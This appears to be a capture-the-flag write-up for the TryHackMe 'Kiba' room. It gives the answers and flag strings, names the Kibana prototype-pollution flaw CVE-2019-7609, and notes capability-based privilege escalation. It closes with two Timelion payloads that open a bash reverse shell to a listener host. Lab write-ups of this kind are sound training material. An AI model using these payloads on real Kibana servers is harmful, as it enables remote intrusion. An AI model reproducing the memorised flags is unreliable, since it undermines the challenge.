
# <div align="center">[Kiba](https://tryhackme.com/r/room/kiba)</div>
<div align="center">Identify the critical security flaw in the data visualization dashboard, that allows execute remote code execution.</div>
<br>
<div align="center">
<img src="https://github.com/user-attachments/assets/58d506f4-0582-421d-88bb-56cc46af47fb" height="200"></img>
</div>

## Task 1. Flags
Are you able to complete the challenge?
The machine may take up to 7 minutes to boot and configure

### What is the vulnerability that is specific to programming languages with prototype-based inheritance?
```
Prototype pollution
```
### What is the version of visualization dashboard installed in the server?
```
6.5.4
```
### What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000
```
CVE-2019-7609
```
### Compromise the machine and locate user.txt
```
THM{1s_easy_pwn3d_k1bana_w1th_rce}
```
### Capabilities is a concept that provides a security system that allows "divide" root privileges into different values
```
No answer needed
```
### How would you recursively list all of these capabilities?
```
getcap -r /
```
### Escalate privileges and obtain root.txt
```
THM{pr1v1lege_escalat1on_us1ng_capab1l1t1es}
```

### Payload 
```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/127.0.0.1/6666 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```
or
```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```
